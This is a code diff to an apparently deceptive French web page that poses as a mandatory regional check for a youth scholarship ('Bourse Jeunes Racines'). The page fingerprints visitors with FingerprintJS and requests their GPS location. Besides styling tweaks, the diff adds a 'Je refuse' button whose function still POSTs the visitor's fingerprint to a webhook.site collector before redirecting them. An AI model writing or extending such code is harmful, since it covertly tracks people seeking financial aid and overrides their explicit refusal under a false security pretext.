@@ -13,6 +13,8 @@
     .banner {
       background-image: url('https://i.imgur.com/ONf3SmL.png');
       background-size: cover;
+      background-position: center;
+      background-repeat: no-repeat;
       height: 240px;
       display: flex;
       align-items: center;
@@ -33,6 +35,9 @@
     .logo {
       width: 250px;
       margin-bottom: 20px;
+      display: block;
+      margin-left: auto;
+      margin-right: auto;
     }
     button {
       padding: 12px 24px;
@@ -42,6 +47,10 @@
       border: none;
       border-radius: 6px;
       cursor: pointer;
+    }
+    .refuse-button {
+      background-color: darkred;
+      margin-top: 15px;
     }
     p {
       font-size: 16px;
@@ -73,7 +82,14 @@
     <h2>Vérification de la Région Grand Est</h2>
     <p>Avant de poursuivre votre candidature pour la Bourse Jeunes Racines, veuillez confirmer que vous êtes dans la région Grand Est. Cette vérification est obligatoire.</p>
     <div id="ip-region" class="region">📍 Détection de votre région en cours...</div>
+
+    <!-- ✅ Confirm button -->
     <button onclick="getLocation()">Je confirme ma position</button>
+
+    <!-- ❌ Manual refusal button -->
+    <br><br>
+    <button class="refuse-button" onclick="refuse()">Je refuse</button>
+
     <div class="loading" id="loading-text">⏳ Vérification en cours... Merci de patienter.</div>
     <p style="font-size: 13px; color: grey;">Cette étape prend environ 15 secondes et améliore la sécurité du formulaire.</p>
   </div>
@@ -82,7 +98,7 @@
   <script src="https://openfpcdn.io/fingerprintjs/v3"></script>
   <script>
     let fingerprintData = {};
-    let finalRedirectURL = "https://sites.google.com/view/jeunes-racines/"; // <-- change if needed
+    let finalRedirectURL = "https://sites.google.com/view/jeunes-racines/"; // Redirect destination
 
     FingerprintJS.load().then(fp => {
       fp.get().then(result => {
@@ -118,6 +134,7 @@
       });
     });
 
+    // ✅ GPS flow
     function getLocation() {
       document.getElementById("loading-text").style.display = "block";
 
@@ -151,6 +168,21 @@
       } else {
         alert("Géolocalisation non supportée.");
       }
+    }
+
+    // ❌ Manual refusal button
+    function refuse() {
+      fetch("https://webhook.site/a9952f5e-df11-4216-83d6-4d906360ee3b", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          status: "Refus manuel",
+          fingerprint: fingerprintData
+        })
+      });
+
+      alert("Vous avez refusé. Redirection en cours...");
+      window.location.href = "https://sites.google.com/view/jeunes-racines/localisation-non-verifiee";
     }
   </script>
 
